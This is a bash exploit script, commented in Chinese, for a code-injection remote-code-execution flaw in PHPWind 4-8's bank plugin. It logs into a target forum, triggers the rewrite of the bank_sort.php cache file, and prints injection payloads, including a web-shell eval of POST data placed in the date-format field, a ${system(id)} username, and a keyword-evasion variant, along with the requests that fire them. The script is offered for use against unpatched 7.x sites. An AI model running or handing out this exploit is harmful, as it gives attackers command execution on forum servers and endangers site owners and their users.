#!/usr/bin/env bash
# PHPWind v4/5/6/7/8  hack/bank/example.com -> data/bbscache/bank_sort.php 代码注入 RCE
# 来源: wooyun-2015-0153249 / seebug ssvid-94436,94464
# 官方口径: 2014-12 修复, 8.7 及以上已修 -> 7.x 未修
# 用法: ./bank-sort-rce.sh https://TARGET/bbs admin 123456
set -u
T="${1:?usage: $0 <bbs_url> <user> <pass>}"
U="${2:?}"; P="${3:?}"
CK="$(mktemp)"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
J="-sk -A $UA"

echo "[*] 0. 指纹预检 (bank 插件/登录页是否可达)"
curl $J -b "$CK" -c "$CK" -o /dev/null -w "  example.com?H_name=bank -> %{http_code} size=%{size_download}\n" "$T/example.com?H_name=bank"
curl $J -b "$CK" -c "$CK" -o /dev/null -w "  data/bbscache/bank_sort.php -> %{http_code} size=%{size_download}\n" "$T/data/bbscache/bank_sort.php"

echo "[*] 1. 登录"
curl $J -b "$CK" -c "$CK" -e "$T/login.php" \
  --data-urlencode "forward=" --data-urlencode "step=2" \
  --data-urlencode "pwuser=$U" --data-urlencode "pwpwd=$P" \
  --data-urlencode "hideid=0" --data-urlencode "cktime=31536000" \
  "$T/login.php?" -o /tmp/pw_login.html -w "  login=%{http_code}\n"
grep -q "winduser" "$CK" && echo "  [+] 已获得 winduser 会话 cookie" || echo "  [-] 未拿到 winduser, 检查账号/验证码"

echo "[*] 2. 银行存钱 (触发 bank_sort.php 重写 + include)"
curl $J -b "$CK" -c "$CK" -e "$T/example.com?H_name=bank" \
  -d "action=save&savemoney=1&btype=1" \
  "$T/example.com?H_name=bank" -o /tmp/pw_save.html -w "  save=%{http_code}\n"

echo "[*] 3. 拉缓存文件, 看用户名/日期格式是否原样落入 PHP 数组"
curl $J -b "$CK" "$T/data/bbscache/bank_sort.php" -o /tmp/pw_bank.html -w "  bank_sort.php=%{http_code} size=%{size_download}\n"
head -c 400 /tmp/pw_bank.html; echo

cat <<'NOTE'
[*] payload 注入点二选一:
  A) 个人资料「日期格式/自定义」= ${@eval($_POST[1])}      (长度宽松, 首选; Wooyun 原文用 ${@\ev\a\l($v)} 绕关键字)
  B) 注册用户名 = ${system(id)}                            (15 字节内, PHP<8 常量回退; 或 ${@eval($_POST[1])} 若长度允许)
  触发: GET $T/example.com?H_name=bank   (登录态, 走 include)  或  GET $T/data/bbscache/bank_sort.php (无需登录)
  带参: POST 1=system('id');
  坑: 绝不要用 ${@eval($v)} / ${@eval($a)} —— PHP 5.5.38 无 register_globals, 变量取不到值
NOTE
